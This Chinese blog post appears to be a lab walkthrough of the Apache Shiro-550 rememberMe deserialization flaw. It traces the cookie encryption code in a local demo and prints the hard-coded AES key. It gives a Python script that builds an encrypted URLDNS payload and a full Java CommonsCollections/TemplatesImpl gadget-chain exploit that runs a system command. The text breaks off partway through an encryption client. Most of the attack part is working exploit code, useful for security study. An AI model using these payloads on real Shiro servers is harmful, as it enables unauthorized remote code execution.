    <content type="html"><![CDATA[<p><a href="https://juejin.cn/post/7133959651653058574">参考文章1</a>     <a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.999.0.0&amp;vd_source=bacfffe46b930fda5761b63367eb298c">参考视频 </a>  <a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">参考文章2</a></p><p>(<strong>主要看参考文章2</strong>)</p><h2 id="Shiro简介"><a href="#Shiro简介" class="headerlink" title="Shiro简介"></a>Shiro简介</h2><p><a href="https://link.juejin.cn/?target=https%3A%2F%2Fso.csdn.net%2Fso%2Fsearch%3Fq%3DApache%26spm%3D1001.2101.3001.7020">Apache</a> Shiro 是一个强大易用的Java安全框架,提供了认证、授权、加密和会话管理等功能，Shiro框架直观、易用、同时也能提供健壮的安全性。</p><p>Apache Shiro<a href="https://link.juejin.cn/?target=https%3A%2F%2Fso.csdn.net%2Fso%2Fsearch%3Fq%3D%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%26spm%3D1001.2101.3001.7020">反序列化</a>漏洞分为两种：<strong>Shiro-550</strong>、<strong>Shiro-721</strong></p><h2 id="Shiro-550反序列化漏洞"><a href="#Shiro-550反序列化漏洞" class="headerlink" title="Shiro-550反序列化漏洞"></a>Shiro-550反序列化漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。 那么，Payload产生的过程： 命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值 在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Shiro &lt; 1.2.4</p><h3 id="Shiro反序列化的特征"><a href="#Shiro反序列化的特征" class="headerlink" title="Shiro反序列化的特征"></a>Shiro反序列化的特征</h3><p>返回包中会包含rememberMe=deleteMe字段</p><p>这种情况大多会发生在登录处，返回包里包含remeberMe=deleteMe字段，这个是在返回包中(Response)</p><p>如果返回的数据包中没有remeberMe=deleteMe字段的话，可以在数据包中的Cookie中添加remeberMe=deleteMe字段这样也会在返回包中有这个字段</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这里用的P神给的环境 ：<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p><ul><li>JDK 8u65</li><li>Tomcat 9</li><li>Shiro 1.2.4</li><li>Commons Collection 3.2.1</li></ul><p>先把p神的项目下载下来</p><p><img src="../images/image-20230619172524775.png" alt="image-20230619172524775"></p><p>然后用<code>idea</code>打开<code>shirodemo</code></p><p><img src="../images/image-20230619172551611.png" alt="image-20230619172551611"></p><p>接着就是配置<code>tomacat</code>了</p><p><img src="../images/image-20230619172643791.png" alt="image-20230619172643791"></p><p>先去官网把他下载下来</p><p>然后进入idea打开设置</p><p><img src="../images/image-20230619172728851.png" alt="image-20230619172728851"></p><p><img src="../images/image-20230619172749282.png" alt="image-20230619172749282"></p><p>添加tomacat的路径</p><p><img src="../images/image-20230619172816282.png" alt="image-20230619172816282"></p><p>接着点击这个</p><p><img src="../images/image-20230619172838144.png" alt="image-20230619172838144"></p><p>先配置这个</p><p><img src="../images/image-20230619172854359.png" alt="image-20230619172854359"></p><p>最后就完成了</p><p><img src="../images/image-20230619172911210.png" alt="image-20230619172911210"></p><h3 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h3><p>先抓个包看看  </p><p>默认账号密码</p><ul><li>root</li><li>secret</li></ul><p><strong>(重点是得勾选这个<code>remember me</code>)</strong></p><p><img src="../images/image-20230619173801606.png" alt="image-20230619173801606"></p><p><strong>固定会返回这个<code>rememberMe=deleteMe</code></strong></p><p>并且这个<code>cookie</code>很长(<strong>这就说明了这个cookie存着一些信息</strong>)</p><p>我们就去代码里找一下看这个<code>cookie</code>是怎么生成的</p><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p><strong>在登录成功后会对cookie进行编码加密 ，我们来跟一下这个加密流程</strong></p><p>入口是在 <code>AbstractRememberMeManager.onSuccessfulLogin</code> 方法</p><p><img src="../images/image-20230619175908159.png" alt="image-20230619175908159"></p><p>判断 token 是否为 true，然后调用 <code>rememberIdentity</code>：</p><p><img src="../images/image-20230619180002676.png" alt="image-20230619180002676"></p><p>看一下这个 <code>getIdentityToRemember</code>：</p><p><img src="../images/image-20230619180033277.png" alt="image-20230619180033277"></p><p>大致就是获取用户名赋值给 <code>principals</code>。</p><p>回到<code>rememberIdentity</code>跟进<code>this.rememberIdentity(subject, principals)</code>：</p><p><img src="../images/image-20230619180132520.png" alt="image-20230619180132520"></p><p>跟进 <code>convertPrincipalsToBytes</code> 看看：</p><p><img src="../images/image-20230619180150004.png" alt="image-20230619180150004"></p><p>先对用户名进行序列化处理，然后调用了个<code>this.getCipherService()</code>方法是否有返回值，跟进查看：</p><p><img src="../images/image-20230619180226872.png" alt="image-20230619180226872"></p><p>返回了一种 AES 的加密方式CBC。</p><p>回到<code>convertPrincipalsToBytes</code>方法，接着调用<code>this.encrypt(bytes)</code>对序列化后的用户名进行加密操作，跟进：</p><p><img src="../images/image-20230619180301097.png" alt="image-20230619180301097"></p><p>这里同样是先用<code>getCipherService</code>方法获取一个加密方式，如果不是空则用该加密方式调用<code>encrypt</code>方法进行加密，AES加密是个对称加密需要密钥，所以这里用<code>getEncryptionCipherKey</code>获取一个密钥，跟进看看：</p><p><img src="../images/image-20230619180347089.png" alt="image-20230619180347089"></p><p>看来是直接返回了这个密钥，由于我们知道这个漏洞就是因为密钥是硬编码写好的造成的，所以我们往回找找这个密钥是哪里赋值的。</p><p>找到这个AbstractRememberMeManager类初始化的时候会，调用<code>setCipherKey</code>方法来设置密钥：</p><p><img src="../images/image-20230619180422223.png" alt="image-20230619180422223"></p><p>跟进<code>setCipherKey</code>方法瞧一眼：</p><p><strong><img src="../images/image-20230619180444210.png" alt="image-20230619180444210"></strong></p><p>正如上面说的AES是对称加密，加密和解密的密钥是同一个，这里就是用传进来的密钥分别赋值给加密密钥和解密密钥，跟进<code>setEncryptionCipherKey</code>：</p><p><img src="../images/image-20230619180515710.png" alt="image-20230619180515710"></p><p>这里就是直接赋值了（吐槽下，真套呀，不过还能看得懂，没套晕）</p><p>回到AbstractRememberMeManager类初始化的<code>this.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</code>这里，这里传入的静态变量DEFAULT_CIPHER_KEY_BYTES实在类定义里面写好的：</p><p><img src="../images/image-20230619180524282.png" alt="image-20230619180524282"></p><p>就是说这个 <code>encryptionCipherKey</code> 是 <code>kPH+bIxk5D2deZiIxcaaaA==</code> 的解密，是一个常量 就是说让用户名的序列化和一个常量进入 <code>cipherService.encrypt</code> 进行加密：</p><p><img src="../images/image-20230619180616452.png" alt="image-20230619180616452"></p><p>具体加密就不看了，不懂密码学。</p><p>总之对学列化后的用户名进行AES加密之后会返回字节到<code>rememberIdentity</code>方法：</p><p><img src="../images/image-20230619180706415.png" alt="image-20230619180706415"></p><p>进入下一步的<code>rememberSerializedIdentity</code>方法：</p><p><img src="../images/image-20230619181422498.png" alt="image-20230619181422498"></p><p>刚才都还是在AbstractRememberMeManager类里面调用，这时候就来到了CookieRememberMeManager类里面，看类名大概能猜到是处理cookie的了。</p><p>这里逻辑就是对传进来的字节进行base64加密，然后设置为名字为rememberMe的cookie值。(<strong>根据这个函数名得知，这里是会对cookie进行序列化处理的</strong>)</p><h3 id="解密分析"><a href="#解密分析" class="headerlink" title="解密分析"></a>解密分析</h3><p>现在我们从<code>getRememberedIdentity</code>开始分析，文件位置 <code>org/apache/shiro/mgt/DefaultSecurityManager.java</code></p><p><img src="../images/image-20230619182115535.png" alt="image-20230619182115535"></p><p>跟进到<code>getRememberedPrincipals</code>：</p><p><img src="../images/image-20230619182143104.png" alt="image-20230619182143104"></p><p>继续跟到<code>getRememberedSerializedIdentity</code>：</p><p><img src="../images/image-20230619182230245.png" alt="image-20230619182230245"></p><p>这里的逻辑是先获取cookie中rememberMe的值，然后判断是否是deleteMe，不是则判断是否是符合base64的编码长度，然后再对其进行base64解码，将解码结果返回。</p><p>返回 <code>getRememberedPrincipals</code>方法，下一步跟进 <code>convertBytesToPrincipals</code>方法：</p><p><img src="../images/image-20230619182456872.png" alt="image-20230619182456872"></p><p>可以看到就进行了两个操作 <code>decrypt</code> 和 <code>deserialize</code>。解密就是和加密的逆过程，不多说，进入 <code>deserialize</code>：</p><p><img src="../images/image-20230619182549894.png" alt="image-20230619182549894"></p><p>继续跟进套娃的<code>deserialize</code>：</p><p><img src="../images/image-20230619182713824.png" alt="image-20230619182713824"></p><p>发现<code>readObject</code>方法出现了，下面就可以愉快地进行反序列化了！</p><p><strong>加密解密跟解密都跟完了</strong>  </p><p>(<strong>如果我们能根据这个固定密钥来伪造cookie的话，这样的话就可以进行恶意操作了</strong>)</p><h3 id="AES密钥判断"><a href="#AES密钥判断" class="headerlink" title="AES密钥判断"></a>AES密钥判断</h3><p>前面说到 Shiro 1.2.4以上版本官方移除了代码中的默认密钥，要求开发者自己设 置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。 但是即使升级到了1.2.4以上的版本，很多开源的项目会自己设定密钥。可以收集密钥的集合，或者对密钥进行爆破。</p><p>那么如何判断密钥是否正确呢？文章<a href="https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&amp;mid=2247485052&amp;idx=1&amp;sn=b007a722e233b45982b7a57c3788d47d&amp;scene=21#wechat_redirect">一种另类的 shiro 检测方式</a>提供了思路，当密钥不正确或类型转换异常时，目标Response包含<code>Set-Cookie：rememberMe=deleteMe</code>字段，而当密钥正确且没有类型转换异常时，返回包不存在<code>Set-Cookie：rememberMe=deleteMe</code>字段。</p><p>因此我们需要构造payload<strong>排除类型转换错误</strong>，进而准确判断密钥。</p><p>shiro在1.4.2版本之前， AES的模式为CBC， IV是随机生成的，并且IV并没有真正使用起来，所以整个AES加解密过程的key就很重要了，正是因为AES使用Key泄漏导致反序列化的cookie可控，从而引发反序列化漏洞。在1.4.2版本后，shiro已经更换加密模式 AES-CBC为 AES-GCM，脚本编写时需要考虑加密模式变化的情况。</p><p><a href="https://www.cnblogs.com/zpchcbd/p/15092263.html">可测试key是否正确</a></p><h3 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h3><p>通过漏洞原理可以知道，构造Payload需要将利用链通过AES加密后在base64编码。将Payload的值设置为rememberMe的cookie值，这里借助ysoserial中的URLDNS链去打，<strong>由于URLDNS不依赖于Commons Collections包，只需要JDK的包就行，所有一半用于检测是否存在漏洞</strong>。</p><p><strong>python脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># －*-* coding:utf-8</span></span><br><span class="line"><span class="comment"># @Time    :  2020/10/16 17:36</span></span><br><span class="line"><span class="comment"># @Author  : nice0e3</span></span><br><span class="line"><span class="comment"># @FileName: poc.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    ：https://www.cnblogs.com/nice0e3/</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rememberme</span>(<span class="params">command</span>):</span><br><span class="line">    popen = subprocess.Popen([<span class="string">r&#x27;D:\Program Files\Java\jdk1.8.0_301\bin\java.exe&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">r&#x27;F:\CTF资料\CTF工具\ysoserial\target\ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span>, <span class="string">&#x27;URLDNS&#x27;</span>, command],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = <span class="string">b&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 替换dnslog</span></span><br><span class="line">    payload = rememberme(<span class="string">&#x27;http://dq6w3y.dnslog.cn&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure><p>将得到的payload用Burp传入rememberMe的cookie值中：</p><p><strong>当存在 JSESSIONID 时，会忽略 rememberMe，所以在攻击时需要将 JSESSIONID 删掉</strong></p><p><img src="../images/image-20230619201344721.png" alt="image-20230619201344721"></p><p><img src="../images/image-20230619201350611.png" alt="image-20230619201350611"></p><p>成功</p><h3 id="CC6-TemplatesImpl链"><a href="#CC6-TemplatesImpl链" class="headerlink" title="CC6+TemplatesImpl链"></a>CC6+TemplatesImpl链</h3><p>但是仅仅是URLDNS是不够的，我们想要的是执行恶意代码，所以先引入Commons Collections 3.2.1 包来进行利用构造。</p><p>(<strong>这里用常规的<code>cc6</code>链子是打不通的，用了话会报错，导致无法执行</strong>)<br>(<strong>就是反序列化流中包含非Java自身的数组，则会出现无法加载类的错误</strong>)</p><p><strong>我们就得去找cc中还有没有没用数组的来替换cc6中使用数组的部分</strong></p><p>这里感兴趣为啥的话可以看看 <a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">参考文章2</a></p><p><img src="../images/20220503212131.png" alt="img"></p><p><strong>这次用这张图片   觉得写的不错</strong></p><p>我们不难发现实际上CC4和CC2是没有用到Transformer数组的，但CC4依赖的是Commons Collections4这个包，当前环境无法使用这条链，拿还有啥方法呢？</p><p>我们可以尝试去改造CC6这条链的后半部分，在CC6链中，我们用到了一个类， <code>TiedMapEntry</code> ，其构造函数接受两个参数，参数1是一个Map，参数2是一个对象key。TiedMapEntry 类有个 <code>getValue</code> 方法，调用了map的get方法，并传入key：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键点就是这个<strong>key</strong></p><p>当这个map是<code>LazyMap</code>时，其get方法就是触发<code>transform</code>的关键点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们以往构造CommonsCollections Gadget的时候，对 <code>LazyMap#get</code> 方法的参数key是不关心的，因为通常Transformer数组的首个对象是ConstantTransformer，我们通过ConstantTransformer来初始化恶意对象。</p><p>但是此时我们无法使用Transformer数组了，也就不能再用ConstantTransformer了。此时我们却惊奇的发现，这个 <code>LazyMap#get</code> 的参数key，会被传进<code>transform()</code>，实际上它可以扮演 ConstantTransformer的角色——一个简单的对象传递者。</p><p>我们<code>LazyMap.get(key)</code>直接调用<code>InvokerTransfomer.transform(key)</code>，然后像CC2那样调用<code>TempalteImpl.newTransformer()</code>来完成后续调用。</p><p><img src="../images/20220503224146.png" alt="img"></p><p><strong>最终exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shiro550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fileNmae, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fileNmae);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//CC.CC3</span></span><br><span class="line"><span class="comment">//        TemplatesImpl templates = new TemplatesImpl();</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates,&quot;_name&quot;, &quot;aaaaa&quot;);</span></span><br><span class="line"><span class="comment">//        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\Coding\\Java\\VulTest\\CC\\target\\classes\\Shiro\\EvilTemplatesImpl.class&quot;));</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC.CC2</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC.CC6</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line"></span><br><span class="line">        setFieldValue(lazyMap, <span class="string">&quot;factory&quot;</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(expMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后将生成的<code>ser.bin</code>用加密脚本给进行加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"> </span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">Shiro550Client</span> &#123;</span><br><span class="line">    public static void main(String []args) throws Exception &#123;</span><br><span class="line">        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">&quot;E:\\Coding\\Java\\VulTest\\CC\\ser.bin&quot;</span>));</span><br><span class="line">        AesCipherService aes = new AesCipherService();</span><br><span class="line">        byte[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        